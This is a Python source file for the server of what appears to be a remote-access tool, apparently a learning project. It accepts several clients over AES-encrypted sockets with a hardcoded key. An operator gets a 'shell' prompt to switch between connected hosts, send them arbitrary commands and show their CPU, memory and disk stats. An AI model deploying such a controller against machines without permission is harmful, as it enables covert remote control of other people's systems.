import socket
import json
import termcolor
from rich.console import Console
from rich.table import Table
from rich.live import Live
import threading
from Crypto.Cipher import AES
import time
from Crypto.Util.Padding import pad, unpad

#variables 

clients = {}
lock = threading.Lock()  
key = b'just for test123'
listen_clients = 5
server_id = 0
curr_sys = ""

def color(text, col):
    return termcolor.colored(text, col)


# AES communications
def aes_encrypt(plaintext, key):
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    return cipher.iv + ct_bytes

def aes_decrypt(ciphertext, key):
    iv = ciphertext[:AES.block_size]
    ct = ciphertext[AES.block_size:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(ct), AES.block_size)
    return decrypted.decode()

#TODO Learn Threads_lock
def handle_clients():
    global clients
    while True:
        conn, addr = s.accept()
        with lock:
            clients[addr] = conn


def show_stats(cpu_percent, V_ram, dsk_usage, duration=5):
    console = Console()
    start_time = time.time()

    def create_table(cpu, memory, disk):
        table = Table(title="System Stats")
        table.add_column("Metric", justify="left", style="cyan", no_wrap=True)
        table.add_column("Value", justify="right", style="magenta")
        table.add_row("CPU Usage", f"{cpu}%")
        table.add_row("Memory Usage", f"{memory}%")
        table.add_row("Disk Usage", f"{disk}%")
        return table

    with Live(console=console, refresh_per_second=1) as live:
        while time.time() - start_time < duration:
            live.update(create_table(cpu_percent, V_ram, dsk_usage))
            time.sleep(1)

def send(client, data):
    msg = json.dumps(data)
    msg = aes_encrypt(msg, key)
    client.send(msg)

def recv(client) -> str:
    data = b""
    try:
        while True:
            chunk = client.recv(1024)
            if not chunk:
                break
            data += chunk
            try:
                decrypted = aes_decrypt(data, key)
                return json.loads(decrypted)
            except (ValueError, json.JSONDecodeError):
                continue
    except Exception as e:
        print(f"Error receiving data: {e}")
    return None


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
HOST = "localhost"
PORT = 6969
s.bind((HOST, PORT))
s.listen(listen_clients)
print(termcolor.colored("Server started and listening...", "green"))


threading.Thread(target=handle_clients, daemon=True).start()


while True:
    if clients:

        try:
            addr, conn = list(clients.items())[server_id]
        except (ValueError, IndexError) as e:
            print(termcolor.colored(f"Some Error Happened. {e}", "red"))
            continue
        prompt = input(f"[{color("*", "blue")}] {color("shell", "green")}~{addr[0]} {curr_sys}")
        if prompt.lower().startswith("switch"):
            try:
                server_id = int(prompt.split()[1]) - 1
                curr_sys = ""
            except:
                continue

        elif prompt.lower() == "active":
            with lock:
                print(color("Connected clients:", "cyan"))
                for i, (addr, conn) in enumerate(clients.items(), 1):
                    print(f"[{i}] {color(addr[0], "blue")}")
        else:
            send(conn, prompt)
            from_client = recv(conn)
            if from_client.startswith("####CPUM#### "):
                stats = from_client.split("####CPUM#### ")[1].split("-")
                show_stats(stats[0], stats[1], stats[2])
            else:
                print(from_client)

        